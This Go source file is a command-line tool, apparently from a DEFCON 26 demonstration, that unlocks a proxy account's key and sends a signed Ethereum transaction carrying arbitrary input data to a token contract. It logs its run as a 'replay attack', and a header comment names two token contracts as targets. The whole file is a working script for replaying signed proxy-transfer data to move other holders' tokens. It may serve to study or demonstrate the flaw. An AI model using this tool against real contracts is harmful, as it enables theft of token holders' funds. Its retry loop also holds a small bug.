package main

import (
	"context"
	"errors"
	"path/filepath"

	"os"

	"fmt"

	"log"

	"crypto/ecdsa"

	"encoding/hex"

	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/node"
	"github.com/nkbai/defcon26/accounts"
	"github.com/nkbai/goice/utils"
	"github.com/slonzok/getpass"
	"github.com/urfave/cli"
)

//transfer from `from` to `to` `amount` tokens by proxy
//ugt: 0x3772cedc564cf1e9ae23d761ff8a79cf764ea58b
//mtc:0x0913358c40bf86af448bb3af5a20d9da1b7475da
func main() {
	app := cli.NewApp()
	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:  "keystore-path",
			Usage: "If you have a non-standard path for the ethereum keystore directory provide it using this argument. ",
			Value: filepath.Join(node.DefaultDataDir(), "keystore"),
		},
		cli.StringFlag{
			Name:  "proxy",
			Usage: "use this proxy's service to transfer,this account must have enough ether for transaction gas",
		},
		cli.StringFlag{
			Name:  "token",
			Usage: "which token to transfer by proxy",
		},
		cli.StringFlag{
			Name: "eth-rpc-endpoint",
			Usage: `"host:port" address of ethereum JSON-RPC server.\n'
	           'Also accepts a protocol prefix (ws:// or ipc channel) with optional port',`,
			Value: node.DefaultIPCEndpoint("geth"),
		},
		cli.StringFlag{
			Name:  "data",
			Usage: "transaction input data",
		},
	}
	app.Action = mainCtx
	app.Name = "trwithdata"
	app.Version = "0.1"
	err := app.Run(os.Args)
	if err != nil {
		log.Fatalf("run err %s", err)
	}
}
func promptAccount(addr common.Address, keystorePath string, hint string) (key *ecdsa.PrivateKey, err error) {
	am := accounts.NewAccountManager(keystorePath)
	if len(am.Accounts) == 0 {
		err = fmt.Errorf("No Ethereum accounts found in the directory %s", keystorePath)
		return
	}
	for i := 0; i < 3; i++ {
		var keybin []byte
		//retries three times
		password := getpass.Prompt(fmt.Sprintf("Enter the password to unlock %s account", hint))
		keybin, err = am.GetPrivateKey(addr, password)
		if err != nil && i == 3 {
			log.Printf(fmt.Sprintf("Exhausted passphrase unlock attempts for %s. Aborting ...", addr))
			utils.SystemExit(1)
		}
		if err != nil {
			log.Printf(fmt.Sprintf("password incorrect\n Please try again or kill the process to quit.\nUsually Ctrl-c."))
			continue
		}
		key, err = crypto.ToECDSA(keybin)
		return
	}
	err = errors.New("must specified password")
	return
}

//TransferTo ether to address
func txwithdata(conn *ethclient.Client, from *ecdsa.PrivateKey, to common.Address, data []byte) error {
	ctx := context.Background()
	auth2 := bind.NewKeyedTransactor(from)
	fromaddr := auth2.From
	nonce, err := conn.NonceAt(ctx, fromaddr, nil)
	if err != nil {
		return err
	}
	msg := ethereum.CallMsg{From: fromaddr, To: &to, Value: nil, Data: data}
	gasLimit, err := conn.EstimateGas(ctx, msg)
	if err != nil {
		return fmt.Errorf("failed to estimate gas needed: %v", err)
	}
	gasPrice, err := conn.SuggestGasPrice(ctx)
	if err != nil {
		return fmt.Errorf("failed to suggest gas price: %v", err)
	}
	rawTx := types.NewTransaction(nonce, to, nil, gasLimit, gasPrice, data)
	// Create the transaction, sign it and schedule it for execution
	signedTx, err := auth2.Signer(types.HomesteadSigner{}, auth2.From, rawTx)
	if err != nil {
		return err
	}
	if err = conn.SendTransaction(ctx, signedTx); err != nil {
		return err
	}
	_, err = bind.WaitMined(ctx, conn, signedTx)
	if err != nil {
		return err
	}
	fmt.Printf("tx from %s to %s amount=0,data=%s\n", fromaddr.String(), to.String(), hex.EncodeToString(data))
	return nil
}
func mainCtx(ctx *cli.Context) (err error) {
	log.Printf("welcome to %s,version %s\n", ctx.App.Name, ctx.App.Version)
	token := common.HexToAddress(ctx.String("token"))
	proxy := common.HexToAddress(ctx.String("proxy"))
	data, err := hex.DecodeString(ctx.String("data"))
	if err != nil {
		return err
	}
	log.Printf("replay attack, token is %s, proxy is %s\n data is %s\n",
		token.String(), proxy.String(), ctx.String("data"))
	proxykey, err := promptAccount(proxy, ctx.String("keystore-path"), "proxy")
	conn, err := ethclient.Dial(ctx.String("eth-rpc-endpoint"))
	if err != nil {
		return err
	}
	return txwithdata(conn, proxykey, token, data)
}
